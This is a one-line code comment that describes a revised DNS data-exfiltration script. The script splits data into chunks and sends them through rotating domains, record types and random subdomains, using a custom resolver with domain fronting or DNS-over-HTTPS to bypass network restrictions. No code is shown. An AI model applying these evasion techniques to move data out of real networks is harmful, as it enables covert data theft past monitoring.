#This revised version of the script uses multiple domains and record types in a round-robin fashion, and generates a random subdomain name for each chunk of data. It also uses a custom DNS resolver, which can be configured to use advanced techniques such as domain fronting or DNS-over-HTTPS to bypass network restrictions.
